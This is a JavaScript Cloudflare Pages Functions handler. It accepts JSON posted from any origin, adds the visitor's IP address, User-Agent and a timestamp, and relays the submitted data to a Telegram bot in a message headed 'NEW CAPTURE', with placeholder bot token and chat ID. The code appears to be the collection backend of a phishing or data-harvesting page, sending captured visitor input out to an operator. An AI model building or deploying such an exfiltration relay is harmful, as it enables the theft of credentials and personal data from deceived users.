export async function onRequestPost(context) {
  try {
    const body = await context.request.json();
    const ip = context.request.headers.get('CF-Connecting-IP') || 'unknown';
    const ua = context.request.headers.get('User-Agent') || '';
    const time = new Date().toISOString();

    const payload = { ...body, ip, ua, time };

    const BOT_TOKEN = 'YOUR_BOT_TOKEN';
    const CHAT_ID = 'YOUR_CHAT_ID';

    if (BOT_TOKEN !== 'YOUR_BOT_TOKEN') {
      const text = `NEW CAPTURE\nIP: ${ip}\nType: ${body.type || '-'}\nUA: ${ua.substring(0, 80)}\nTime: ${time}\nData: ${JSON.stringify(body.data || {}).substring(0, 500)}`;
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text })
      });
    }

    return new Response(JSON.stringify({ status: 'ok' }), {
      headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
    });
  } catch (e) {
    return new Response(JSON.stringify({ status: 'error', message: e.message }), {
      status: 400,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

export async function onRequestOptions() {
  return new Response(null, {
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type'
    }
  });
}
